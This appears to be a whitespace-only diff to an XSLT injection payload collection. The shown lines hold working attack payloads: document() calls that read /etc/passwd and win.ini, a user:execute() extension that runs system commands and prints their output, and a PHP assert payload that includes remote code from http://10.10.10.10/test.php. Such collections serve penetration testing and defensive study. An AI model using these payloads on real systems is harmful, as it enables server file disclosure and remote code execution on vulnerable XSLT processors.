@@ -25,7 +25,7 @@
 <?xml version="1.0" encoding="utf-8"?>
 <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
   <xsl:template match="/fruits">
-	<xsl:value-of select="system-property('xsl:vendor')"/>
+ <xsl:value-of select="system-property('xsl:vendor')"/>
   </xsl:template>
 </xsl:stylesheet>
 ```
@@ -69,7 +69,7 @@
     <xsl:copy-of select="document('/etc/passwd')"/>
     <xsl:copy-of select="document('file:///c:/winnt/win.ini')"/>
     Fruits:
-	    <!-- Loop for each fruit -->
+     <!-- Loop for each fruit -->
     <xsl:for-each select="fruit">
       <!-- Print name: description -->
       - <xsl:value-of select="name"/>: <xsl:value-of select="description"/>
@@ -103,8 +103,8 @@ return proc.StandardOutput.ReadToEnd();
 
   <xsl:template match="/fruits">
   --- BEGIN COMMAND OUTPUT ---
-	<xsl:value-of select="user:execute()"/>
-  --- END COMMAND OUTPUT ---	
+ <xsl:value-of select="user:execute()"/>
+  --- END COMMAND OUTPUT ---
   </xsl:template>
 </xsl:stylesheet>
 ```
@@ -138,10 +138,10 @@ Execute a remote php file using `assert`
 <?xml version="1.0" encoding="UTF-8"?>
 <html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
 <body style="font-family:Arial;font-size:12pt;background-color:#EEEEEE">
-		<xsl:variable name="payload">
-			include("http://10.10.10.10/test.php")
-		</xsl:variable>
-		<xsl:variable name="include" select="php:function('assert',$payload)"/>
+  <xsl:variable name="payload">
+   include("http://10.10.10.10/test.php")
+  </xsl:variable>
+  <xsl:variable name="include" select="php:function('assert',$payload)"/>
 </body>
 </html>
 ```
